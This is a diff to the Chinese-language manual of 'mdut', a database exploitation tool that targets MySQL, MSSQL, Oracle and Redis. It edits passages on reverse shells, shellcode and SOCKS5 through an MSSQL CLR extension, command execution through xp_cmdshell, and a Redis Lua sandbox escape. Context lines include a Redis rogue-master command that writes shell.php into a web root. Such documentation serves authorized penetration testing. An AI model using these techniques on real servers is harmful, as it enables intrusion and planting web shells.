@@ -269,7 +269,7 @@ printf 'id\nwhoami\nexit\n' | mdut cli -d "mysql://root:secret@127.0.0.1:3306/my
 - 下载先取远端大小，按解码后的字节偏移读取。
 - 支持 0 字节文件。
 - MSSQL 只有 `ChunkedIO` 可用时才允许分块上传/下载；普通文件浏览不强制要求 CLR。
-- Oracle 的 `--mkdir` 当前不支持；不支持 `--hash-file` 的策略会明确报错。
+- Oracle 的 `--mkdir` 使用 Java 策略递归创建缺失的父目录；目标目录已存在时幂等成功，路径被普通文件占用或创建失败时明确报错。Scheduler 策略会明确报告不支持；不支持 `--hash-file` 的策略也会明确报错。
 
 示例：
 
@@ -355,8 +355,8 @@ mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" \
 ### 10.2 MSSQL（仅 Windows 目标）
 
 - 执行策略按 xp_cmdshell → OLE → Agent Job 降级，Agent Job 只有盲执行。
-- Windows 可附加 CLR 扩展，提供反弹 Shell、Shellcode、SOCKS5、文件管理和分块 I/O。
-- 无 CLR 时，目录浏览等操作仍可能由 xp_cmdshell/OLE 提供，以实际能力报告为准。
+- Windows 可附加 CLR 扩展，提供反弹 Shell、Shellcode 和 SOCKS5。
+- 文件管理与分块 I/O 不依赖 CLR；无 CLR 时仍可按内置策略能力上传、下载和浏览目录，以实际能力报告为准。
 - 部署前记录 xp_cmdshell/OLE 原配置，清理时恢复原值，不会把管理员原本开启的配置直接关闭。
 - MSSQL Linux 不在 CLI 支持范围。
 
@@ -404,6 +404,8 @@ mdut cli -d "redis://127.0.0.1:6379" \
   --rogue host.docker.internal:21000 \
   --write-precise --src ./shell.php --dst /var/www/html/shell.php
 ```
+
+- 目录探测（`DirProbe`）可用时，`--list-dir` 直接列目录，不为此部署 Module；Lua 沙箱逃逸通道可用时，`--revshell` 也不为此部署 Module。其他文件操作及 SOCKS5 仍要求 Module。
 
 - 直接走主从复制，不部署或清理 Module。
 - **会清空目标内存数据集并覆盖同名文件**。
